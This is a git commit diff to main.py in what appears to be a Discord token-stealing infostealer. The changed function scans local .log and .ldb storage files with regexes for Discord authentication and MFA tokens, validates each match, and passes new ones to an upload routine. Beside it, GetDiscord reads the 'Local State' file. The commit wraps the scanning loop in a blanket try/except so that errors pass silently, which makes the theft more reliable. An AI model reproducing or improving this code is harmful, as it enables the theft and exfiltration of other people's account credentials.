b4f4bc38996f716a414f12bb52cf8244bbdc498a
TheCuteOwl <114611129+TheCuteOwl@users.noreply.github.com>
2023-11-11 19:25:31 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1263,21 +1263,23 @@ def histup():
         pass
 Tokqs = []
 def getTokq(path, arg):
-    if not os.path.exists(path):
-        return
+    try:
+        if not os.path.exists(path):
+            return
 
-    path += arg
-    for file in os.listdir(path):
-        if file.endswith(".log") or file.endswith(".ldb")   :
-            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
-                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
-                    for Tokq in re.findall(regex, line):
-                        global Tokqs
-                        if checkTokq(Tokq) == True:
-                            if not Tokq in Tokqs:
-                                Tokqs += Tokq
-                                uploadTokq(Tokq, path)
-
+        path += arg
+        for file in os.listdir(path):
+            if file.endswith(".log") or file.endswith(".ldb")   :
+                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                        for Tokq in re.findall(regex, line):
+                            global Tokqs
+                            if checkTokq(Tokq) == True:
+                                if not Tokq in Tokqs:
+                                    Tokqs += Tokq
+                                    uploadTokq(Tokq, path)
+    except:
+        pass
 def GetDiscord(path, arg):
     try:
         if not os.path.exists(f"{path}/Local State"): return
